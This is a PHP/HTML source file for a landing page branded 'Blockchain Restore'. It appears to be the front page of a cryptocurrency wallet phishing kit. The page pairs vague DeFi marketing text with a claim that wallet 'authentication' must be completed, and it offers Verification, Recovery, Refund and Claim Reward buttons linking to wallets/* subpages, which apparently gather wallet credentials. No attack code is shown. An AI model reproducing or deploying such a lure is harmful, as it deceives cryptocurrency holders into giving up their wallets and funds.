<?php
// Date in the past
header("Expires: Mon, 26 Jul 1997 05:00:00 GMT");
header("Cache-Control: no-cache");
header("Pragma: no-cache");

ini_set('session.gc_maxlifetime', 86400);
session_start();

require_once("includes/functions.php");

require_once("includes/mobile-detect.php");
$detect = new Mobile_Detect;
?>
<!DOCTYPE html>
<html lang="en-US" dir="ltr">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">

<base href="<?php directory(); ?>" target="_top">

<meta name="robots" content="index, follow" />
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="keywords" content="<?php echo $gen_name; ?>, Coins">
<meta name="author" content="<?php echo $gen_name; ?>">
<meta name="description" content="<?php echo $full_gen_name; ?>"/>
<link rel="canonical" href="<?php echo $actual_link; ?>"/>
<link rel="alternate" href="<?php echo $domain; ?>" hreflang="en-ng"/>

<link rel="shortcut icon" href="<?php echo new_version("{$images}favicon.png"); ?>">
<link rel="apple-touch-icon" sizes="120x120" href="<?php echo new_version("{$images}favicon.png"); ?>">
<link rel="apple-touch-icon" sizes="152x152" href="<?php echo new_version("{$images}favicon.png"); ?>">
<title><?php echo $full_gen_name; ?></title>
  
<!-- Favicons-->
<link rel="shortcut icon" href="<?php echo new_version("{$images}favicon.png"); ?>">
<!-- Favicons-->
<link rel="apple-touch-icon-precomposed" href="<?php echo new_version("{$images}favicon.png"); ?>">
<!-- For iPhone -->
<meta name="msapplication-TileColor" content="#b20">
<meta name="msapplication-TileBackground" content="#000">
<meta name="msapplication-TileImage" content="<?php echo new_version("{$images}favicon.png"); ?>">
<!-- For Windows Phone -->
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, minimum-scale=1.0, maximum-scale=1.0">
<meta name="apple-mobile-web-app-capable" content="yes">

<meta property="og:url" content="<?php directory(); ?>" /> 
<meta property="og:type" content="article" />
<meta property="og:title" content="<?php echo $full_gen_name; ?>" /> 
<meta property="og:description" content="<?php echo $full_gen_name; ?>" /> 
<meta property="og:image" content="<?php directory(); echo new_version("{$images}logos/yomijojolo-logo.png"); ?>" />
<meta property="og:image:type" content="image/png" />
<meta property="og:image:width" content="140" />
<meta property="og:image:height" content="140" />

<link type="text/css" rel="stylesheet" href="css/bootstrap.css" />
<link type="text/css" rel="stylesheet" href="css/font-awesome.css" />
<link type="text/css" rel="stylesheet" href="<?php echo new_version("css/style.css"); ?>" />
<style>
<!--
.uppermost{
background: #ddd url(<?php directory(); echo new_version("{$images}home/banner.jpg"); ?>) fixed no-repeat left top;
-webkit-background-size: cover; 
-moz-background-size: cover; 
-o-background-size: cover; 
background-size: cover;
}
.uppermost-inner{
background:rgba(0,0,0,0.5);
min-height:550px;
}
.uppermost h1{
font-size:30px;
font-weight:900;
color:#fff;
margin-top:250px;
text-shadow: 2px 2px #666, -2px -2px 5px #666, -2px 0px 5px #666, 0px -2px 5px #666;
}

.introduction{
padding-top:20px;
}
.introduction h1, .introduction h1 *{
text-transform:uppercase;
}

.selection-grids *{
text-align:center;
}
.selection-grid{
padding:10px;
}
.section-item{
background:#eee;
border:1px solid #eee;
padding:10px;
}
.section-item:hover{
background:#ddd;
border:1px solid #a94442;
}
.selection-grid p{
font-weight:900;
font-size:20px;
color:#060;
}
-->
</style>
</head>

<body>

<?php //require_once("includes/upper.php"); ?>

<div class="home-body-wrapper uppermost"> 
<div class="uppermost-inner">
<div class="home-body"> 

<h1 class="align-center">THE BITCOIN AND BLOCKCHAIN<br>ITS POWER FOR INNOVATION</h1>

</div>
</div>
</div>

<div class="home-body-wrapper introduction"> 
<div class="home-body"> 

<h1 class="body-header align-center">Blockchain <span>Restore</span></h1>
<p>Blockchain Restore is a decentralized platform and network that blends Blockchain with DeFi, incorporating Blockchain aspects such as non-custodial management, Micropools, rapid liquidity, and decentralized governance. Each procedure must be completed in its entirety. The authentication of wallet will be finished as follows.</p>

</div>
</div>

<div class="home-body-wrapper selection-grids"> 
<div class="home-body row"> 

<div class="col-sm-3 selection-grid">
<div class="section-item border-radius">
<img src="images/home/verification.png">
<p>Verification</p>
<div><a href="wallets/verification/" class="btn gen-btn border-radius">CHOOSE</a></div>
</div>
</div>
<div class="col-sm-3 selection-grid">
<div class="section-item border-radius">
<img src="images/home/recovery.png">
<p>Recovery</p>
<div><a href="wallets/recovery/" class="btn gen-btn border-radius">CHOOSE</a></div>
</div>
</div>
<div class="col-sm-3 selection-grid">
<div class="section-item border-radius">
<img src="images/home/investment.png">
<p>Investment</p>
<div><a href="wallets/investment/" class="btn gen-btn border-radius">CHOOSE</a></div>
</div>
</div>
<div class="col-sm-3 selection-grid">
<div class="section-item border-radius">
<img src="images/home/refund.png">
<p>Refund</p>
<div><a href="wallets/refund/" class="btn gen-btn border-radius">CHOOSE</a></div>
</div>
</div>
<div class="col-sm-3 selection-grid">
<div class="section-item border-radius">
<img src="images/home/claim-reward.png">
<p>Claim Reward</p>
<div><a href="wallets/claim-reward/" class="btn gen-btn border-radius">CHOOSE</a></div>
</div>
</div>

</div>
</div>

<?php require_once("includes/footer.php"); ?>